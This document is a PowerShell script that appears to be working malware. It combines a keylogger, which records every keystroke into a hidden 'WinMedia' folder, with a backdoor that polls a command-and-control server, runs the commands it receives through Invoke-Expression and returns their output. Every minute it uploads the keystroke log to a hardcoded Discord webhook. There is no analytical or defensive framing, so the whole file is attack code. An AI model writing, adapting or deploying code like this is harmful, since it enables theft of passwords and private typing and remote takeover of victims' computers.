# 1. Core Variable Setup (Hardcoded & Direct)
$PCName     = "chase"
$WebhookUrl = "https://discord.com/api/webhooks/1505177594226540655/BZPbc_W_oqVyfZEM0B5crFb3v3C03lgFeAU9DcdGrzUUCm_JbqsKoA8gIJMm4nlGDoxr"
$C2Url      = "https://chase-4ebb.onrender.com"
$dir        = "$env:LOCALAPPDATA\WinMedia"

if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
$logFile = "$dir\data.txt"

# 2. Complete Win32 API Engine (Handles Character Cases and Special Keys)
$Source = @'
using System;
using System.Text;
using System.Runtime.InteropServices;

public class KeyEngine {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
    [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")] public static extern uint MapVirtualKey(uint uCode, uint uMapType);
    [DllImport("user32.dll")] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
}
'@
Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue

# Create the log file cleanly
"START_LOG`n" | Out-File $logFile -Force

# Thread timing controls for web traffic
$c2Interval = 0
$discordInterval = 0
$headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }

# 3. Main Operational Loop
while ($true) {
    
    # === ENGINE A: UNICODE & SPECIAL KEY ENGINE ===
    for ($i = 1; $i -le 254; $i++) {
        if ([KeyEngine]::GetAsyncKeyState($i) -eq -32767) {
            $keyText = ""
            
            switch ($i) {
                8   { $keyText = " [BACKSPACE] " }
                9   { $keyText = " [TAB] " }
                13  { $keyText = "`n" }
                16  { $keyText = "" } # Shift tracking is handled by ToUnicode automatically
                17  { $keyText = " [CTRL] " }
                18  { $keyText = " [ALT] " }
                20  { $keyText = " [CAPS] " }
                27  { $keyText = " [ESC] " }
                32  { $keyText = " " }
                46  { $keyText = " [DEL] " }
                default {
                    # Query active Windows keyboard layouts to convert raw keystrokes to lowercase/uppercase
                    $keyState = New-Object byte[] 256
                    [KeyEngine]::GetKeyboardState($keyState) | Out-Null
                    $scanCode = [KeyEngine]::MapVirtualKey($i, 0)
                    $buffer = New-Object System.Text.StringBuilder 5

                    $rc = [KeyEngine]::ToUnicode($i, $scanCode, $keyState, $buffer, $buffer.Capacity, 0)
                    if ($rc -gt 0) { $keyText = $buffer.ToString() }
                }
            }

            if ($keyText -ne "") {
                try { $keyText | Out-File $logFile -Append -NoNewline -ErrorAction SilentlyContinue } catch {}
            }
        }
    }

    # === ENGINE B: C2 WEB CONTROLLER POLLING (Every 5 Seconds) ===
    if ($c2Interval -ge 500) {
        try {
            $cmdResponse = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get -Headers $headers -TimeoutSec 5
            if ($cmdResponse -and $cmdResponse -ne 'wait') {
                $output = (Invoke-Expression $cmdResponse 2>&1 | Out-String)
                if (!$output) { $output = 'Command executed with no return data.' }
                Invoke-RestMethod -Uri "${C2Url}/send_res?id=${PCName}" -Method Post -Body @{ output = $output } -Headers $headers -TimeoutSec 5 | Out-Null
            }
        } catch {}
        $c2Interval = 0
    }

    # === ENGINE C: DISCORD EXFILTRATION (Every 60 Seconds) ===
    if ($discordInterval -ge 6000) {
        if (Test-Path $logFile) {
            if ((Get-Item $logFile).Length -gt 0) {
                try {
                    $timestamp = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
                    $fileName = "${PCName}_${timestamp}.txt"
                    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form @{ file = Get-Item $logFile; filename = $fileName } -TimeoutSec 10 | Out-Null
                    Clear-Content $logFile -ErrorAction SilentlyContinue
                } catch {}
            }
        }
        $discordInterval = 0
    }

    # 10 millisecond loop tick checks
    Start-Sleep -m 10
    $c2Interval += 10
    $discordInterval += 10
}
